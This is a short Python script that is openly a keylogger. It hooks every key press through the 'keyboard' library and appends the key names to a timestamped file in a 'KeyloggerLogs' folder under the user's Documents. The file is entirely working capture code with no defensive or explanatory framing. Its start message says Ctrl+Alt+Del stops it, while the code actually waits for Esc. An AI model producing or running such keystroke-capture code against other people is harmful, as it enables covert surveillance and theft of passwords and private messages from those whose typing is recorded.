import keyboard
import datetime
import os

# Create logs directory if it doesn't exist
log_dir = os.path.expanduser("~\\Documents\\KeyloggerLogs")
os.makedirs(log_dir, exist_ok=True)

# Generate a timestamp for the log file
timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
log_file = os.path.join(log_dir, f"keylog_{timestamp}.txt")

def on_key_press(event):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(event.name + " ")

if __name__ == "__main__":
    print("Keylogger started. Press Ctrl+Alt+Del to stop.")
    keyboard.on_press(on_key_press)
    keyboard.wait("esc")  # Wait for ESC to exit